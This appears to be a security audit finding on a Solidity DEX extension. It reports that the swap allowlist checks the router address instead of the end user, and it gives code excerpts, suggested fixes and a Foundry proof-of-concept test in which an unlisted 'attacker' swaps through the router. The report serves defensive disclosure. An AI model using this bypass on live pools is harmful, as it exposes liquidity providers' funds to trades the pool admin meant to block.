### Title
SwapAllowlistExtension Gates on Router Address Instead of End-User, Enabling Full Allowlist Bypass via MetricOmmSimpleRouter - (File: metric-periphery/contracts/extensions/SwapAllowlistExtension.sol)

---

### Summary

`SwapAllowlistExtension.beforeSwap` checks the `sender` argument, which is `msg.sender` of `pool.swap()`. When a user routes through `MetricOmmSimpleRouter`, the router becomes `msg.sender` of `pool.swap()`, so the extension checks whether the **router** is allowlisted, not the actual end-user. A pool admin who allowlists the router to support router-mediated swaps for their curated users inadvertently opens the pool to every user on the network.

---

### Finding Description

`SwapAllowlistExtension.beforeSwap` receives `sender` as its first argument and checks it against the per-pool allowlist keyed by `msg.sender` (the pool):

```solidity
// SwapAllowlistExtension.sol L31-41
function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
}
```

The pool populates `sender` with its own `msg.sender` — the direct caller of `pool.swap()`:

```solidity
// MetricOmmPool.sol L230-240
_beforeSwap(
    msg.sender,   // ← sender = direct caller of pool.swap()
    recipient,
    ...
)
```

When a user calls `MetricOmmSimpleRouter.exactInputSingle()`, the router calls `pool.swap()` without forwarding the original caller:

```solidity
// MetricOmmSimpleRouter.sol L71-80
_setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
(int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
    .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData   // original msg.sender stored only in transient callback context, never forwarded to pool
    );
```

The original `msg.sender` is stored in transient storage only for the payment callback — it is never passed to `pool.swap()`. Therefore `pool.swap()` sees `msg.sender = router`, and the extension checks `allowedSwapper[pool][router]`.

A pool admin who wants to support router-mediated swaps for their allowlisted users has only one option: allowlist the router address. Once the router is allowlisted, `allowedSwapper[pool][router] = true`, and the check passes for **every** user who calls through the router, regardless of whether that user is individually allowlisted.

---

### Impact Explanation

On a curated pool where the pool admin has allowlisted the `MetricOmmSimpleRouter` to support standard periphery access, any unpermissioned user can execute swaps by calling `router.exactInputSingle()` or any other `exact*` entry point. The extension sees `sender = router` (allowlisted) and passes. LP funds are exposed to trades from actors the pool admin explicitly intended to exclude. This is a direct loss of LP principal on pools that rely on `SwapAllowlistExtension` for access control.

---

### Likelihood Explanation

The scenario is realistic and likely:

1. Pool admins deploying curated pools with `SwapAllowlistExtension` will naturally want their allowlisted users to access the pool through the standard `MetricOmmSimpleRouter` (the supported periphery).
2. The only way to enable router-mediated swaps is to allowlist the router address.
3. Once the router is allowlisted, the per-user gate is fully bypassed for all router callers.
4. No privileged access, no special tokens, and no admin cooperation is required from the attacker — any EOA can call `router.exactInputSingle()`.

---

### Recommendation

The extension must check the economically relevant actor — the end-user — not the intermediary router. Two complementary fixes:

**Option A — Check `recipient` instead of `sender` for router paths.** This is insufficient alone because `recipient` is also caller-controlled.

**Option B — Require the router to forward the original caller in `extensionData`.** The router would encode `msg.sender` into `extensionData`, and the extension would decode and check it. This requires a coordinated change to both the router and the extension.

**Option C (preferred) — Add a `trustedForwarder` registry to the extension.** If `sender` is a registered trusted forwarder (e.g., the router), decode the real user from `extensionData` and check that address instead:

```solidity
function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata extensionData)
    external view override returns (bytes4)
{
    address swapper = isTrustedForwarder[msg.sender][sender]
        ? abi.decode(extensionData, (address))
        : sender;
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][swapper]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
}
```

The router must then encode `msg.sender` into `extensionData` before calling `pool.swap()`.

---

### Proof of Concept

```solidity
function test_routerBypassesSwapAllowlist() public {
    // Setup: pool with SwapAllowlistExtension
    // Pool admin allowlists alice and the router (to support router-mediated swaps)
    swapExtension.setAllowedToSwap(address(pool), alice, true);
    swapExtension.setAllowedToSwap(address(pool), address(router), true);

    // Attacker is NOT individually allowlisted
    address attacker = makeAddr("attacker");
    assertFalse(swapExtension.isAllowedToSwap(address(pool), attacker));

    // Attacker calls pool.swap() directly → reverts (attacker not allowlisted)
    vm.prank(attacker);
    vm.expectRevert(IMetricOmmPoolActions.NotAllowedToSwap.selector);
    pool.swap(attacker, false, int128(1000), type(uint128).max, "", "");

    // Attacker calls router.exactInputSingle() → SUCCEEDS
    // Extension sees sender = router (allowlisted), not attacker
    token1.mint(attacker, 10_000);
    vm.startPrank(attacker);
    token1.approve(address(router), 10_000);
    router.exactInputSingle(IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        recipient: attacker,
        zeroForOne: false,
        amountIn: 1000,
        amountOutMinimum: 0,
        priceLimitX64: type(uint128).max,
        deadline: block.timestamp + 1,
        tokenIn: address(token1),
        extensionData: ""
    }));
    vm.stopPrank();
    // Attacker successfully swapped on a pool they were not allowlisted for
}
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L12-13)
```text
  mapping(address pool => mapping(address swapper => bool)) public allowedSwapper;
  mapping(address pool => bool) public allowAllSwappers;
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-80)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
```
